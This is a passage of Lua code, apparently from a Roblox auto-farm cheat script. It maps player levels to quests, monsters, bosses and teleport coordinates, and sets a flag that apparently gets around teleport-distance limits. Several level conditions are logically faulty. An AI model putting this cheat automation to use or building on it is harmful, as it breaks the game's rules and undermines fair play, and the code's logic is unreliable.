				CFrameMon = CFrame.new(976.467651, 111.174057, 1229.1084, 0.00852567982, -4.73897828e-08, -0.999963999, 1.12251888e-08, 1, -4.7295778e-08, 0.999963999, -1.08215579e-08, 0.00852567982)
				
				if SelectMonster == "Swan Pirate" then
				else
					Next_Level_X = 800
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 800 or game.Players.LocalPlayer.Data.Level.Value <= 874 or SelectMonster == "Factory Staff" then -- Factory Staff
				Ms = "Factory Staff"
				NameQuest = "Area2Quest"
				QuestLv = 2
				NameMon = "Factory Staff"
				CFrameQ = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
				CFrameMon = CFrame.new(336.74585, 73.1620483, -224.129272, 0.993632793, 3.40154607e-08, 0.112668738, -3.87658332e-08, 1, 3.99718729e-08, -0.112668738, -4.40850592e-08, 0.993632793)
				
				if SelectMonster == "Factory Staff" then
				else
					Next_Level_X = 875
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 850 then
					SelectBoss_P = "Jeremy"
				end
				SelectMonster = "Swan Pirate"
			elseif game.Players.LocalPlayer.Data.Level.Value == 875 or game.Players.LocalPlayer.Data.Level.Value <= 899 or SelectMonster == "Marine Lieutenant" then -- Marine Lieutenant
				Ms = "Marine Lieutenant"
				NameQuest = "MarineQuest3"
				QuestLv = 1
				NameMon = "Marine Lieutenant"
				CFrameQ = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
				CFrameMon = CFrame.new(-2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299)
				
				if SelectMonster == "Marine Lieutenant" then
				else
					Next_Level_X = 900
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 900 or game.Players.LocalPlayer.Data.Level.Value <= 949 or SelectMonster == "Marine Captain" then -- Marine Captain
				Ms = "Marine Captain"
				NameQuest = "MarineQuest3"
				QuestLv = 2
				NameMon = "Marine Captain"
				CFrameQ = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
				CFrameMon = CFrame.new(-1814.70313, 72.9919434, -3208.86621, -0.900422215, 7.93464423e-08, -0.435017526, 3.68856199e-08, 1, 1.06050372e-07, 0.435017526, 7.94441988e-08, -0.900422215)
				if game.Players.LocalPlayer.Data.Level.Value >= 925 then
					SelectBoss_P = "Fajita"
				end
				if SelectMonster == "Marine Captain" then
				else
					Next_Level_X = 950
				end
				SelectMonster = "Marine Lieutenant"
			elseif game.Players.LocalPlayer.Data.Level.Value == 950 or game.Players.LocalPlayer.Data.Level.Value <= 974 or SelectMonster == "Zombie" then -- Zombie
				Ms = "Zombie"
				NameQuest = "ZombieQuest"
				QuestLv = 1
				NameMon = "Zombie"
				CFrameQ = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
				CFrameMon = CFrame.new(-5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-08, 0.934775114, 1.65461245e-08, 1, 8.04023372e-08, -0.934775114, -1.3095117e-08, 0.355238914)
				
				if SelectMonster == "Zombie" then
				else
					Next_Level_X = 975
				end
				Bypass_TP_Dis = true
			elseif game.Players.LocalPlayer.Data.Level.Value == 975 or game.Players.LocalPlayer.Data.Level.Value <= 999 or SelectMonster == "Vampire" then -- Vampire
				Ms = "Vampire"
				NameQuest = "ZombieQuest"
				QuestLv = 2
				NameMon = "Vampire"
				CFrameQ = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
				CFrameMon = CFrame.new(-6030.32031, 0.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
				
				if SelectMonster == "Vampire" then
				else
					Next_Level_X = 1000
				end
				Bypass_TP_Dis = true
				SelectMonster = "Zombie"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1000 or game.Players.LocalPlayer.Data.Level.Value <= 1049 or SelectMonster == "Snow Trooper" then -- Snow Trooper **
				Ms = "Snow Trooper"
				NameQuest = "SnowMountainQuest"
				QuestLv = 1
				NameMon = "Snow Trooper"
				CFrameQ = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
				CFrameMon = CFrame.new(621.003418, 391.361053, -5335.43604, 0.481644779, 0, 0.876366913, 0, 1, 0, -0.876366913, 0, 0.481644779)
				
				if SelectMonster == "Snow Trooper" then
				else
					Next_Level_X = 1050
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 1050 or game.Players.LocalPlayer.Data.Level.Value <= 1099 or SelectMonster == "Winter Warrior" then -- Winter Warrior
				Ms = "Winter Warrior"
				NameQuest = "SnowMountainQuest"
				QuestLv = 2
				NameMon = "Winter Warrior"
				CFrameQ = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
				CFrameMon = CFrame.new(1295.62683, 429.447784, -5087.04492, -0.698032081, -8.28980049e-08, -0.71606636, -1.98835952e-08, 1, -9.63858184e-08, 0.71606636, -5.30424877e-08, -0.698032081)
				
				if SelectMonster == "Winter Warrior" then
				else
					Next_Level_X = 1100
				end
				SelectMonster = "Snow Trooper"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1100 or game.Players.LocalPlayer.Data.Level.Value <= 1124 or SelectMonster == "Lab Subordinate" then -- Lab Subordinate
				Ms = "Lab Subordinate"
				NameQuest = "IceSideQuest"
				QuestLv = 1
				NameMon = "Lab Subordinate"
				CFrameQ = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
				CFrameMon = CFrame.new(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
				
				if SelectMonster == "Lab Subordinate" then
				else
					Next_Level_X = 1125
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 1125 or game.Players.LocalPlayer.Data.Level.Value <= 1174 or SelectMonster == "Horned Warrior" then -- Horned Warrior
				if game.Players.LocalPlayer.Data.Level.Value >= 1150 then
					SelectBoss_P = "Smoke Admiral"
				end
				Ms = "Horned Warrior"
				NameQuest = "IceSideQuest"
				QuestLv = 2
				NameMon = "Horned Warrior"
				CFrameQ = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
				CFrameMon = CFrame.new(-6401.27979, 15.9775667, -5948.24316, 0.388303697, 0, -0.921531856, 0, 1, 0, 0.921531856, 0, 0.388303697)
				
				if SelectMonster == "Horned Warrior" then
				else
					Next_Level_X = 1175
				end
	
				SelectMonster = "Lab Subordinate"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1175 or game.Players.LocalPlayer.Data.Level.Value <= 1199 or SelectMonster == "Magma Ninja" then -- Magma Ninja
				Ms = "Magma Ninja"
				NameQuest = "FireSideQuest"
				QuestLv = 1
				NameMon = "Magma Ninja"
				CFrameQ = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
				CFrameMon = CFrame.new(-5466.06445, 57.6952019, -5837.42822, -0.988835871, 0, -0.149006829, 0, 1, 0, 0.149006829, 0, -0.988835871)
				
				if SelectMonster == "Magma Ninja" then
				else
					Next_Level_X = 1200
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 1200 or game.Players.LocalPlayer.Data.Level.Value <= 1249 or SelectMonster == "Lava Pirate" then 
				Ms = "Lava Pirate"
				NameQuest = "FireSideQuest"
				QuestLv = 2
				NameMon = "Lava Pirate"
				CFrameQ = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
				CFrameMon = CFrame.new(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
				
				if SelectMonster == "Lava Pirate" then
				else
					Next_Level_X = 1250
				end
				SelectMonster = "Magma Ninja"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1250 or game.Players.LocalPlayer.Data.Level.Value <= 1274 or SelectMonster == "Ship Deckhand" then 
				Ms = "Ship Deckhand"
				NameQuest = "ShipQuest1"
				QuestLv = 1
				NameMon = "Ship Deckhand"
				CFrameQ = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
				CFrameMon = CFrame.new(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
				if SelectMonster == "Ship Deckhand" then
				else
					Next_Level_X = 1275
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 1275 or game.Players.LocalPlayer.Data.Level.Value <= 1299 or SelectMonster == "Ship Engineer" then 
				Ms = "Ship Engineer"
				NameQuest = "ShipQuest1"
				QuestLv = 2
				NameMon = "Ship Engineer"
				CFrameQ = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
				CFrameMon = CFrame.new(921.30249023438, 125.400390625, 32937.34375)
				if SelectMonster == "Ship Engineer" then
				else
					Next_Level_X = 1300
				end
				SelectMonster = "Ship Deckhand"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1300 or game.Players.LocalPlayer.Data.Level.Value <= 1324 or SelectMonster == "Ship Steward" then 
				Ms = "Ship Steward"
				NameQuest = "ShipQuest2"
				QuestLv = 1
				NameMon = "Ship Steward"
				CFrameQ = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
				CFrameMon = CFrame.new(917.96057128906, 136.89932250977, 33343.4140625)
				if SelectMonster == "Ship Steward" then
				else
					Next_Level_X = 1325
				end
				SelectMonster = "Ship Deckhand"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1325 or game.Players.LocalPlayer.Data.Level.Value <= 1349 or SelectMonster == "Ship Officer" then 
				Ms = "Ship Officer"
				NameQuest = "ShipQuest2"
				QuestLv = 2
				NameMon = "Ship Officer"
				CFrameQ = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
				CFrameMon = CFrame.new(944.44964599609, 181.40081787109, 33278.9453125)
				if SelectMonster == "Ship Officer" then
				else
					Next_Level_X = 1350
				end
				SelectMonster = "Ship Steward"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1350 or game.Players.LocalPlayer.Data.Level.Value <= 1374 or SelectMonster == "Arctic Warrior" then 
				Ms = "Arctic Warrior"
				NameQuest = "FrostQuest"
				QuestLv = 1
				NameMon = "Arctic Warrior"
				CFrameQ = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
				CFrameMon = CFrame.new(5878.23486, 81.3886948, -6136.35596, -0.451037169, 2.3908234e-07, 0.892505825, -1.08168464e-07, 1, -3.22542007e-07, -0.892505825, -2.4201924e-07, -0.451037169)
				
				if SelectMonster == "Arctic Warrior" then
				else
					Next_Level_X = 1375
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 1375 or game.Players.LocalPlayer.Data.Level.Value <= 1424 or SelectMonster == "Snow Lurker" then -- Snow Lurker
				if game.Players.LocalPlayer.Data.Level.Value >= 1400 then
					SelectBoss_P = "Awakened Ice Admiral"
				end
				Ms = "Snow Lurker"
				NameQuest = "FrostQuest"
				QuestLv = 2
				NameMon = "Snow Lurker"
				CFrameQ = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
				CFrameMon = CFrame.new(5513.36865, 60.546711, -6809.94971, -0.958693981, -1.65617333e-08, 0.284439981, -4.07668654e-09, 1, 4.44854642e-08, -0.284439981, 4.14883701e-08, -0.958693981)
				
				if SelectMonster == "Snow Lurker" then
				else
					Next_Level_X = 1450
				end
			
				SelectMonster = "Arctic Warrior"
			elseif game.Players.LocalPlayer.Data.Level.Value == 1425 or game.Players.LocalPlayer.Data.Level.Value <= 1449 or SelectMonster == "Sea Soldier" then -- Sea Soldier
				Ms = "Sea Soldier"
				NameQuest = "ForgottenQuest"
				QuestLv = 1
				NameMon = "Sea Soldier"
				CFrameQ = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
				CFrameMon = CFrame.new(-3115.78223, 63.8785706, -9808.38574, -0.913427353, 3.11199457e-08, 0.407000452, 7.79564235e-09, 1, -5.89660658e-08, -0.407000452, -5.06883708e-08, -0.913427353)
				
				if SelectMonster == "Sea Soldier" then
				else
					Next_Level_X = 1450
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1450 or SelectMonster == "Water Fighter" then -- Water Fighter
				if game.Players.LocalPlayer.Data.Level.Value >= 1475 then
					SelectBoss_P = "Tide Keeper"
				end
				Ms = "Water Fighter"
				NameQuest = "ForgottenQuest"
				QuestLv = 2
				NameMon = "Water Fighter"
				CFrameQ = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
				CFrameMon = CFrame.new(-3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-08, -0.670276582, 1.69155214e-08, 1, -6.46908234e-08, 0.670276582, 3.66697037e-08, 0.742111444)
				
				if SelectMonster == "Water Fighter" then
				else
					Next_Level_X = 9999
				end
				SelectMonster = "Sea Soldier"
			end
		end
		if Zou then
			if game.Players.LocalPlayer.Data.Level.Value >= 1500 and game.Players.LocalPlayer.Data.Level.Value <= 1524 or SelectMonster == "Pirate Millionaire" then -- Pirate Millionaire
				Ms = "Pirate Millionaire"
				NameQuest = "PiratePortQuest"
				QuestLv = 1
				NameMon = "Pirate Millionaire"
				CFrameQ = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
				CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
				
				if SelectMonster == "Pirate Millionaire" then
				else
					Next_Level_X = 1525
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1525 and game.Players.LocalPlayer.Data.Level.Value <= 1574 or SelectMonster == "Pistol Billionaire" then -- Pistol Billionaire
				if game.Players.LocalPlayer.Data.Level.Value >= 1550 then
					SelectBoss_P = "Stone"
				end
				Ms = "Pistol Billionaire"
				NameQuest = "PiratePortQuest"
				QuestLv = 2
				NameMon = "Pistol Billionaire"
				CFrameQ = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
				CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
				
				if SelectMonster == "Pistol Billionaire" then
				else
					Next_Level_X = 1575 
				end
				
				SelectMonster = "Pirate Millionaire"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1575 and game.Players.LocalPlayer.Data.Level.Value <= 1599 or SelectMonster == "Dragon Crew Warrior" then -- Dragon Crew Warrior
				Ms = "Dragon Crew Warrior"
				NameQuest = "AmazonQuest"
				QuestLv = 1
				NameMon = "Dragon Crew Warrior"
				CFrameQ = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
				CFrameMon = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
				
				if SelectMonster == "Dragon Crew Warrior" then
				else
					Next_Level_X = 1600
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1600 and game.Players.LocalPlayer.Data.Level.Value <= 1624 or SelectMonster == "Dragon Crew Archer" then -- Dragon Crew Archer
				Ms = "Dragon Crew Archer"
				NameQuest = "AmazonQuest"
				QuestLv = 2
				NameMon = "Dragon Crew Archer"
				CFrameQ = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
				CFrameMon = CFrame.new(6488.9155273438, 383.38375854492, -110.66246032715)
				
				if SelectMonster == "Dragon Crew Archer" then
				else
					Next_Level_X = 1625
				end
				SelectMonster = "Dragon Crew Warrior"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1625 and game.Players.LocalPlayer.Data.Level.Value <= 1649 or SelectMonster == "Female Islander" then 
				Ms = "Female Islander"
				NameQuest = "AmazonQuest2"
				QuestLv = 1
				NameMon = "Female Islander"
				CFrameQ = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
				CFrameMon = CFrame.new(4770.4990234375, 758.95520019531, 1069.8680419922)
				
				if SelectMonster == "Female Islander" then
				else
					Next_Level_X = 1650
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1650 and game.Players.LocalPlayer.Data.Level.Value <= 1699 or SelectMonster == "Giant Islander" then -- Giant Islander
				Ms = "Giant Islander"
				NameQuest = "AmazonQuest2"
				QuestLv = 2
				NameMon = "Giant Islander"
				CFrameQ = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
				CFrameMon = CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789)
				if game.Players.LocalPlayer.Data.Level.Value >= 1675 then
					SelectBoss_P = "Island Empress"
				end
				if SelectMonster == "Giant Islander" then
				else
					Next_Level_X = 1700
				end
			
				SelectMonster = "Female Islander"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1700 and game.Players.LocalPlayer.Data.Level.Value <= 1774 or SelectMonster == "Marine Commodore" then -- Marine Commodore
				Ms = "Marine Commodore"
				NameQuest = "MarineTreeIsland"
				QuestLv = 1
				NameMon = "Marine Commodore"
				CFrameQ = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
				CFrameMon = CFrame.new(2490.0844726563, 190.4232635498, -7160.0502929688)
				if game.Players.LocalPlayer.Data.Level.Value >= 1750 then
					SelectBoss_P = "Kilo Admiral"
				end
				if SelectMonster == "Marine Commodore" then
				else
					Next_Level_X = 1775
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1775 and game.Players.LocalPlayer.Data.Level.Value <= 1799 or SelectMonster == "Fishman Raider" then -- Fishman Raider
				Ms = "Fishman Raider"
				NameQuest = "DeepForestIsland3"
				QuestLv = 1
				NameMon = "Fishman Raider"
				CFrameQ = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
				CFrameMon = CFrame.new(-10322.400390625, 390.94473266602, -8580.0908203125)
				
				if SelectMonster == "Fishman Raider" then
				else
					Next_Level_X = 1800
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1800 and game.Players.LocalPlayer.Data.Level.Value <= 1824 or SelectMonster == "Fishman Captain" then -- Fishman Captain
				Ms = "Fishman Captain"
				NameQuest = "DeepForestIsland3"
				QuestLv = 2
				NameMon = "Fishman Captain"
				CFrameQ = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
				CFrameMon = CFrame.new(-11194.541992188, 442.02795410156, -8608.806640625)
				
				if SelectMonster == "Fishman Captain" then
				else
					Next_Level_X = 1825
				end
				SelectMonster = "Fishman Raider"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1825 and game.Players.LocalPlayer.Data.Level.Value <= 1849 or SelectMonster == "Forest Pirate" then -- Forest Pirate
				Ms = "Forest Pirate"
				NameQuest = "DeepForestIsland"
				QuestLv = 1
				NameMon = "Forest Pirate"
				CFrameQ = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
				CFrameMon = CFrame.new(-13225.809570313, 428.19387817383, -7753.1245117188)
				
				if SelectMonster == "Forest Pirate" then
				else
					Next_Level_X = 1850
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1850 and game.Players.LocalPlayer.Data.Level.Value <= 1899 or SelectMonster == "Mythological Pirate" then -- Mythological Pirate
				Ms = "Mythological Pirate"
				NameQuest = "DeepForestIsland"
				QuestLv = 2
				NameMon = "Mythological Pirate"
				CFrameQ = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
				CFrameMon = CFrame.new(-13869.172851563, 564.95251464844, -7084.4135742188)
				if game.Players.LocalPlayer.Data.Level.Value >= 1875 then
					SelectBoss_P = "Captain Elephant" 
				end
				if SelectMonster == "Mythological Pirate" then
				else
					Next_Level_X = 1900
				end
			
				SelectMonster = "Forest Pirate"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1900 and game.Players.LocalPlayer.Data.Level.Value <= 1924 or SelectMonster == "Jungle Pirate" then -- Jungle Pirate
				Ms = "Jungle Pirate"
				NameQuest = "DeepForestIsland2"
				QuestLv = 1
				NameMon = "Jungle Pirate"
				CFrameQ = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
				CFrameMon = CFrame.new(-11982.221679688, 376.32522583008, -10451.415039063)
				
				if SelectMonster == "Jungle Pirate" then
				else
					Next_Level_X = 1925
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1925 and game.Players.LocalPlayer.Data.Level.Value <= 1974 or SelectMonster == "Musketeer Pirate" then -- Musketeer Pirate
				Ms = "Musketeer Pirate"
				NameQuest = "DeepForestIsland2"
				QuestLv = 2
				NameMon = "Musketeer Pirate"
				CFrameQ = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
				CFrameMon = CFrame.new(-13282.3046875, 496.23684692383, -9565.150390625)
				
				if SelectMonster == "Musketeer Pirate" then
				else
					Next_Level_X = 1975
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 1950 then
					SelectBoss_P = "Beautiful Pirate"
				end
				SelectMonster = "Jungle Pirate"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 1975 and game.Players.LocalPlayer.Data.Level.Value <= 1999 or SelectMonster == "Reborn Skeleton" then
				Ms = "Reborn Skeleton"
				NameQuest = "HauntedQuest1"
				QuestLv = 1
				NameMon = "Reborn Skeleton"
				CFrameQ = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
				CFrameMon = CFrame.new(-8817.880859375, 191.16761779785, 6298.6557617188)
				
				if SelectMonster == "Reborn Skeleton" then
				elseif not LevelMax then
					Next_Level_X = 2000
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2000 and game.Players.LocalPlayer.Data.Level.Value <= 2024 or SelectMonster == "Living Zombie" then
				Ms = "Living Zombie"
				NameQuest = "HauntedQuest1"
				QuestLv = 2
				NameMon = "Living Zombie"
				CFrameQ = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
				CFrameMon = CFrame.new(-10125.234375, 183.94705200195, 6242.013671875)
				
				if SelectMonster == "Living Zombie" then
				elseif not LevelMax then
					Next_Level_X = 2025
				end
				SelectMonster = "Reborn Skeleton"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2025 and game.Players.LocalPlayer.Data.Level.Value <= 2049  or  SelectMonster == "Demonic Soul" then
				Ms = "Demonic Soul"
				NameQuest = "HauntedQuest2"
				QuestLv = 1
				NameMon = "Demonic"
				CFrameQ = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
				CFrameMon = CFrame.new(-9712.03125, 204.69589233398, 6193.322265625)
				
				if SelectMonster == "Demonic Soul" then
				else
					Next_Level_X = 2050
				end
				SelectMonster = "Living Zombie"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2050 and game.Players.LocalPlayer.Data.Level.Value <= 2074 or SelectMonster == "Posessed Mummy" then
				Ms = "Posessed Mummy"
				NameQuest = "HauntedQuest2"
				QuestLv = 2
				NameMon = "Posessed Mummy"
				CFrameQ = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
				CFrameMon = CFrame.new(-9545.7763671875, 69.619895935059, 6339.5615234375)    
				
				if SelectMonster == "Posessed Mummy" then
				else
					Next_Level_X = 2075
				end
				SelectMonster = "Demonic Soul"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2075 and game.Players.LocalPlayer.Data.Level.Value <= 2099 or SelectMonster == "Peanut Scout" then
				Ms = "Peanut Scout"
				NameQuest = "NutsIslandQuest"
				QuestLv = 1
				NameMon = "Peanut Scout"
				CFrameQ = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
				CFrameMon = CFrame.new(-2098.07544, 192.611862, -10248.8867, 0.983392298, -9.57031787e-08, 0.181492642, 8.7276355e-08, 1, 5.44169616e-08, -0.181492642, -3.76732068e-08, 0.983392298)
				
				if SelectMonster == "Peanut Scout" then
				else
					Next_Level_X = 2100
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2100 and game.Players.LocalPlayer.Data.Level.Value <= 2124 or SelectMonster == "Peanut President" then
				Ms = "Peanut President"
				NameQuest = "NutsIslandQuest"
				QuestLv = 2
				NameMon = "Peanut President"
				CFrameQ = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
				CFrameMon = CFrame.new(-1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-08, 0.998466909, -6.89634405e-10, 1, 2.84654931e-08, -0.998466909, -2.26418861e-09, 0.0553516336)
				SelectMonster = "Peanut Scout"
				
				if SelectMonster == "Peanut President" then
				else
					Next_Level_X = 2125
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2125 and game.Players.LocalPlayer.Data.Level.Value <= 2149 or SelectMonster == "Ice Cream Chef" then
				Ms = "Ice Cream Chef"
				NameQuest = "IceCreamIslandQuest"
				QuestLv = 1
				NameMon = "Ice Cream Chef"
				CFrameQ = CFrame.new(-820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-08, -0.568714678, -2.08336317e-08, 1, 6.20846663e-08, 0.568714678, -3.92184099e-08, 0.822534859)
				CFrameMon = CFrame.new(-821.614075, 208.39537, -10990.7617, -0.870096624, 3.18909272e-08, 0.492881238, -1.8357893e-08, 1, -9.71107568e-08, -0.492881238, -9.35439957e-08, -0.870096624)
				
				if SelectMonster == "Ice Cream Chef" then
				else
					Next_Level_X = 2150
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2150 and game.Players.LocalPlayer.Data.Level.Value <= 2199 or SelectMonster == "Ice Cream Commander" then 
				Ms = "Ice Cream Commander"
				NameQuest = "IceCreamIslandQuest"
				QuestLv = 2
				NameMon = "Ice Cream Commander"
				CFrameQ = CFrame.new(-819.376526, 67.4634171, -10967.2832)
				CFrameMon = CFrame.new(-610.11669921875, 208.26904296875, -11253.686523438)
				
				if SelectMonster == "Ice Cream Commander" then
				else
					Next_Level_X = 2200
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 2175 then
					SelectBoss_P = "Cake Queen"
				end
				SelectMonster = "Ice Cream Chef"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2200 and game.Players.LocalPlayer.Data.Level.Value <= 2224 or SelectMonster == "Cookie Crafter" then 
				Ms = "Cookie Crafter"
				NameQuest = "CakeQuest1"
				QuestLv = 1
				NameMon = "Cookie Crafter"
				CFrameQ = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
				CFrameMon = CFrame.new(-2286.684326171875, 146.5656280517578, -12226.8818359375)
				
				if SelectMonster == "Cookie Crafter" then
				elseif not LevelMax then
					Next_Level_X = 2225
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2225 and game.Players.LocalPlayer.Data.Level.Value <= 2249 or SelectMonster == "Cake Guard" then 
				Ms = "Cake Guard"
				NameQuest = "CakeQuest1"
				QuestLv = 2
				NameMon = "Cake Guard"
				CFrameQ = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
				CFrameMon = CFrame.new(-1817.9747314453125, 209.5632781982422, -12288.9228515625)
				SelectMonster = "Cookie Crafter"
				
				if SelectMonster == "Cake Guard" then
				elseif not LevelMax then
					Next_Level_X = 2250
				end
